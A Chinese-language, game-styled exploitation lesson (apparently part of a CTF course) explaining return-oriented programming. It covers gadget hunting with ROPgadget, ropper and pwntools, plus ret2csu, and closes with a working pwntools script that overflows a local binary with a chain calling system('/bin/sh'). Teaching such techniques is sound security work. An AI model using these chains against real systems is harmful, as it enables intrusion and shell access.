# 第 11 关 · ROP：乐高积木大法

## 🎬 游戏开场

想象你闯进一座乐高乐园，里面散落着无数**小积木块**，每块上刻着一两个动作：

- 一块写着：`把红色零件放到手上，然后传送`（`pop rdi; ret`）
- 一块写着：`把蓝色放到手上，然后传送`（`pop rsi; ret`）
- 一块写着：`两数相加，然后传送`（`add rax, rbx; ret`）
- 一块写着：`纯传送`（`ret`）

单独一块没什么用，但你可以**把它们按顺序拼起来**，让程序依次执行，拼出任何你想要的操作——比如"设置参数 → 调用 system"。

这就是 **ROP（Return-Oriented Programming，返回导向编程）**。

> 游戏版定义：**ROP = 从已有代码里找以 `ret` 结尾的小片段（gadget），用返回地址把它们串成一条"指令链"，从而绕过 NX 执行任意逻辑。**

---

## 🧠 核心概念（游戏版）

### 1. gadget = 以 ret 结尾的小积木

为什么必须是 `ret` 结尾？因为栈溢出只能控制**返回地址**。每次 `ret` 都会从栈上弹下一个地址跳过去——如果那个地址指向另一块"以 ret 结尾"的积木，就会形成**连锁反应**：

```
栈上连续的8字节：
  ┌──────────────┐
  │ gadget1 地址  │ ← 第一次 ret 跳这里
  ├──────────────┤
  │ gadget2 地址  │ ← gadget1 的 ret 跳这里
  ├──────────────┤
  │ gadget3 地址  │ ← gadget2 的 ret 跳这里
  ├──────────────┤
  │ system 地址   │ ← gadget3 的 ret 跳这里，执行最终目标
  └──────────────┘
```

**栈上的这一串地址，就是 ROP 链**——像多米诺骨牌一样，一个 ret 触发下一个。

### 2. 找积木的工具

```bash
# ROPgadget 工具
ROPgadget --binary ./vuln --only "pop|ret"
# 输出类似：
# 0x000000000040101a : pop rdi ; ret
# 0x000000000040101c : pop rsi ; ret
# 0x000000000040101e : ret

# pwntools 内置
python3 -c "
from pwn import *
elf = ELF('./vuln')
rop = ROP(elf)
print(rop.find_gadget(['pop rdi', 'ret']))
"
```

**常见必备 gadget**：

| gadget | 用途 |
| --- | --- |
| `pop rdi; ret` | 设置第1个参数（最常用！） |
| `pop rsi; ret` | 设置第2个参数 |
| `pop rdx; ret` | 设置第3个参数 |
| `ret` | 栈对齐 / 填充 |
| `leave; ret` | 栈迁移（第13关） |

### 3. 拼一条完整的 ROP 链

以 64 位调用 `system("/bin/sh")` 为例，参数要放 rdi：

```
栈 →
  ┌──────────────────┐
  │ pop rdi ; ret 地址 │  ① 跳到这块积木
  ├──────────────────┤
  │ /bin/sh 的地址     │  ② 被 pop 进 rdi（参数就位）
  ├──────────────────┤
  │ ret 地址           │  ③ （可选）栈对齐
  ├──────────────────┤
  │ system 地址        │  ④ 跳到 system，它从 rdi 取到 "/bin/sh"
  └──────────────────┘
```

pwntools 可以自动帮你拼：

```python
rop = ROP(elf)
rop.system(next(libc.search(b'/bin/sh')))  # 自动生成链
payload = b'A' * offset + rop.chain()
```

### 4. 当 gadget 不够用：组合技

现实里你不一定能找到完美的 `pop rdi; ret`。这时候要发挥"乐高精神"：

- **没有 `pop rdi`？** 找 `mov rdi, rax; ret`，再找一块能设置 rax 的（如 `pop rax; ret`），串起来。
- **找不到 `pop rdx`？** 用 `__libc_csu_init` 里的"万能 gadget"——一段能同时设置多个寄存器的积木（经典技巧）。
- **栈空间不够？** 用栈迁移，把 ROP 链搬到别处（第 13 关）。

找 gadget 的进阶工具：

```bash
ROPgadget --binary ./vuln --all        # 列出所有
ropper --file ./vuln --search "pop"    # 更强大的搜索
```

> 🎮 **Pwner 的乐高心法**：不要问"有没有现成的完美积木"，要问"我能不能用现有积木拼出这个动作"。这就是 ROP 的魅力，也是它图灵完备的原因——理论上 ROP 能实现任何计算。

### 5. ret2csu：万能积木

glibc 里有个函数 `__libc_csu_init`，里面常有一段"神级 gadget"：

```asm
pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
```

它能一次性设置 rdi/rsi/rdx（前三个参数）——当标准 gadget 稀缺时，这是救命稻草。新手先知道有这回事，进阶版会详讲。

---

## 🔧 真实世界对照

| 游戏说法 | 真实术语 |
| --- | --- |
| 乐高积木 | gadget（以 ret 结尾的指令片段） |
| 拼积木 | 构造 ROP 链 |
| 多米诺骨牌 | 连续 ret 触发下一段 |
| 找积木 | ROPgadget / ropper / pwntools ROP |

**为什么 ROP 能绕过 NX？** 因为它**不注入新代码**——它执行的每一条指令都来自程序或 libc 原有的、可执行的内存（.text 段）。NX 只禁止"数据区执行"，但代码区本来就能执行，ROP 全在代码区里跳来跳去。

---

## 🎯 闯关任务：手工拼一条 ROP 链

不依赖 pwntools 自动生成，手工拼一次，加深理解：

```python
from pwn import *
context.binary = elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./vuln')

# 手工找 gadget（用 ROPgadget 命令查到的地址）
pop_rdi = 0x40101a      # pop rdi ; ret
ret     = 0x40101b      # ret

# 我们知道 libc 基址的前提（先用上一关的泄露手法获得）
# 这里假设已知：
libc_base = 0x7ffff7dc2000
system = libc_base + libc.sym['system']
binsh  = libc_base + next(libc.search(b'/bin/sh\x00'))

# 手工拼链
chain  = p64(pop_rdi)    # ① pop rdi
chain += p64(binsh)      # ② 参数进 rdi
chain += p64(ret)        # ③ 对齐
chain += p64(system)     # ④ 调用 system

p.sendline(b'A' * 24 + chain)
p.interactive()
```

对比 pwntools 的 `rop.chain()`，看看是不是一样的。理解这条链的每个 8 字节，你就真正懂 ROP 了。

---

## 📌 本关小结

| 你学会了 | 一句话记忆 |
| --- | --- |
| ROP | 拼以 ret 结尾的小积木实现任意逻辑 |
| gadget | 一段 `...; ret` 指令片段 |
| ROP 链 | 栈上一串 gadget 地址，ret 连锁触发 |
| 找 gadget | ROPgadget / pwntools ROP |
| 绕过 NX | 只跳原有代码，不执行注入代码 |

---

## 🎬 下一关预告

**第 12 关 · Canary：骗过餐桌上的警报器**

前面几关我们都假设"没有 Canary"，但现实题目大多开着它。

栈上多了个警报器，你一溢出它就响、程序就崩。怎么办？

下一关教你**怎么偷看 Canary 的值**（提示：格式化字符串漏洞，或逐字节爆破），然后在 payload 里**原样填回去**——让警报器以为什么都没发生。

这是从"理想关"走向"真实关"的关键一步。
